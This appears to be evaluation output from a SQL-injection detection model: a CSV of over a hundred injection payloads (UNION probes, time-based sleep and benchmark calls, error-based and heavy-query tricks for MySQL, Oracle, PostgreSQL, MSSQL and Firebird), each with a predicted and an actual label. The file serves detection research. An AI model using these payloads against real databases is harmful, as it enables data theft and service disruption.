,Query,Prediction,Actual
4106,"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1.0
4107,"-3805""   )    )     )   union all select 9123,9123,9123,9123,9123,9123,9123,9123#",1,1.0
4108,"-4970'  )   union all select 4625,4625,4625,4625,4625,4625,4625,4625#",1,1.0
4109,"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,1.0
4110,"1""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1.0
4111,1'  )   where 8204  =  8204,1,1.0
4112,"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'llfp'  =  'llfp",1,1.0
4113,1'   )    )    as wuws where 6917  =  6917 union all select null#,1,1.0
4114,"1 and elt  (  2770  =  3669,3669  )  # sfls",1,1.0
4115,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",0,1.0
4116,"1""   )    )    as riui where 2605  =  2605",1,1.0
4117,"1' and make_set  (  8403  =  8403,8899  )   and 'lnwe'  =  'lnwe",1,1.0
4118,"-5043%'   )    )     )   union all select 5860,5860,5860,5860,5860#",1,1.0
4119,1  )   waitfor delay '0:0:5'--,1,1.0
4120,-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',1,1.0
4121,"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""jgcv""  =  ""jgcv",1,1.0
4122,"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",1,1.0
4123,"1'   )    )    as peeo where 5356  =  5356 and elt  (  4722  =  2382,2382  )  --",1,1.0
4124,"1'+  (  select ijck where 9961  =  9961 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1,1.0
4125,"1'  )   where 2121  =  2121 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1.0
4126,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'xjvr'  =  'xjvr",1,1.0
4127,"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",1,1.0
4128,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",1,1.0
4129,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,1.0
4130,1%'   )    )     )   rlike   (  select   (  case when   (  7697  =  3334  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',1,1.0
4131,"1'||  (  select 'ymac' from dual where 9268  =  9268 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",1,1.0
4132,waitfor delay '0:0:5' and   (  'gpqx' like 'gpqx,1,1.0
4133,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",1,1.0
4134,1%'   )    )     )   and 7533  =  7533 and    (    (     (  '%'  =  ',1,1.0
4135,1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'bwka'  =  'bwka,1,1.0
4136,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",1,1.0
4137,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""tbdl"" like ""tbdl",1,1.0
4138,"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ecoa"" like ""ecoa",1,1.0
4139,"1%""  )   rlike sleep  (  5  )  #",1,1.0
4140,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'gtov' like 'gtov",1,1.0
4141,1' in boolean mode  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #,1,1.0
4142,"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1.0
4143,select case when 3661  =  9315 then 1 else null end--,1,1.0
4144,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",1,1.0
4145,"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",1,1.0
4146,-2951 or 4189  =  2291,1,1.0
4147,"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",1,1.0
4148,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1.0
4149,1'||  (  select 'ytwz' from dual where 3025  =  3025 and   (  5039  =  5303  )  *5303  )  ||',1,1.0
4150,end and   (  9416  =  9416,1,1.0
4151,"1%'  )   union all select null,null,null,null#",1,1.0
4152,"select * from generate_series  (  7536,7536,case when   (  7536  =  7523  )   then 1 else 0 end  )   limit 1--",1,1.0
4153,"1""   )    )    as femc where 1313  =  1313 and 4595  =  4595#",1,1.0
4154,"1"" where 4298  =  4298 order by 1--",1,1.0
4155,-1468'   )    )     )   or 4875  =  6163#,1,1.0
4156,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1.0
4157,-3062'   )    )    or 6872  =  6872 and    (    (   'uzth' like 'uzth,1,1.0
4158,"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",1,1.0
4159,"-1370'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'xmrg'  =  'xmrg",1,1.0
4160,"1%"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,1,1.0
4161,"-9509  )   union all select 1193,1193,1193#",1,1.0
4162,"1""   )    )    as azak where 4911  =  4911",1,1.0
4163,"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1.0
4164,"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'qpuy'  =  'qpuy",1,1.0
4165,"1' where 8837  =  8837 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1.0
4166,"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""auyv""  =  ""auyv",1,1.0
4167,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1.0
4168,1'   )    )     )   and 4595  =  4595#,1,1.0
4169,"1  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1.0
4170,"1""  )   as ymto where 3453  =  3453",1,1.0
4171,"-7320""  )   where 3907  =  3907 union all select 3907,3907--",1,1.0
4172,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  # mafe",1,1.0
4173,"-1663' or elt  (  1032  =  1032,3623  )   and 'yqaj' like 'yqaj",1,1.0
4174,-3578'   )    )     )   order by 1--,1,1.0
4175,"1%'   )    )     )   union all select null,null,null#",1,1.0
4176,"select sleep  (  5  )   and   (  ""tlbj"" like ""tlbj",1,1.0
4177,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'drvk' like 'drvk",1,1.0
4178,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",1,1.0
4179,"1' in boolean mode  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",1,1.0
4180,"-3834'   )    )     )   union all select 8313,8313--",1,1.0
4181,-8248 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1,1.0
4182,"1   )    )    as juoe where 9994  =  9994 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1.0
4183,"1' where 8950  =  8950 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1.0
4184,1' where 3701  =  3701 and 2006  =  2006,1,1.0
4185,"-1668""   )    )     )   or 9323  =  9323#",1,1.0
4186,"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",1,1.0
4187,"1""  )   rlike   (  select   (  case when   (  5746  =  5367  )   then 1 else 0x28 end   )    )    and   (  ""hnnf"" like ""hnnf",1,1.0
4188,1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cgiu'  =  'cgiu,1,1.0
4189,1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'jzpb'  =  'jzpb,1,1.0
4190,"1'  )   where 8255  =  8255 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1.0
4191,"1%""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,1,1.0
4192,"1'+  (  select pxsd where 2576  =  2576 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",1,1.0
4193,-2207%'  )   or   (  8459  =  8459  )  *4906 and   (  '%'  =  ',1,1.0
4194,"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",1,1.0
4195,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,1,1.0
4196,"-6766"" where 6591  =  6591 or make_set  (  9354  =  9354,7185  )  --",1,1.0
4197,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997",1,1.0
4198,-7610' or 3038  =  3038,1,1.0
4199,1'||  (  select 'gmkp' where 6016  =  6016,1,1.0
4200,"1,  (  case when 6620  =  3092 then 1 else null end  )  ",1,1.0
4201,"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1,1.0
4202,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,1.0
4203,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   7240  =  7240",1,1.0
4204,"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",1,1.0
4205,"-8021'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cenk' like 'cenk",1,1.0
4206,"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,1,1.0
4207,"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,1.0
4208,"1  )   and elt  (  4249  =  4249,7259  )   and   (  8226  =  8226",1,1.0
4209,-6190'   )    )     )   union all select 9413--,1,1.0
4210,"1"" where 5372  =  5372 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1.0
4211,"-4653' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1.0
4212,1'   )    )    and 6690  =  3250#,1,1.0
4213, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   ||',1,1.0
4214,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'vwxg'  =  'vwxg",1,1.0
4215,select   (  case when   (  2676  =  4191  )   then 2676 else 1/  (  select 0  )   end  )  --,1,1.0
4216,-6548 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- rlda,1,1.0
4217,"select * from generate_series  (  9863,9863,case when   (  9863  =  3285  )   then 1 else 0 end  )   limit 1--",1,1.0
4218,"1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#",1,1.0
4219,"1"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1.0
4220,"-5591%""   )    )    order by 1--",1,1.0
4221,1'  )   where 4949  =  4949,1,1.0
4222,"1""   )    )    as sqow where 8752  =  8752",1,1.0
4223,"1  )   where 8008  =  8008 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1.0
4224,"1""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1.0
4225,"1""  )   as frmp where 6073  =  6073",1,1.0
4226,"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1,1.0
4227,-2411 or   (  8459  =  8459  )  *4906# pxwg,1,1.0
4228,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,1.0
4229,"1%"" union all select null,null,null--",1,1.0
4230,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",1,1.0
4231,select   (  case when   (  3716  =  4021  )   then 3716 else 3716*  (  select 3716 from information_schema.character_sets  )   end  )  #,1,1.0
4232,"-2111' union all select 1061,1061,1061--",1,1.0
4233,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1.0
4234,"-8060""  )   where 5290  =  5290 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1,1.0
4235,"-5170'   )    )    as ovbf where 4833  =  4833 union all select 4833,4833,4833,4833--",1,1.0
4236,1' where 5103  =  5103,1,1.0
4237,"-8771""   )    )    union all select 6302,6302,6302,6302,6302#",1,1.0
4238,"1,  (  select   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,null   )    )     )   else 8640/  (  select 0 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --",1,1.0
4239,"-1573""  )   union all select 3928,3928,3928,3928--",1,1.0
4240,1  )   rlike sleep  (  5  )   and   (  5724  =  5724,1,1.0
4241,1  )   where 7096  =  7096,1,1.0
4242,-3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420#,1,1.0
4243,1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069,1,1.0
4244,1,0,1.0
4245,1 where 4787  =  4787,1,1.0
4246,"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,1.0
4247,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",0,1.0
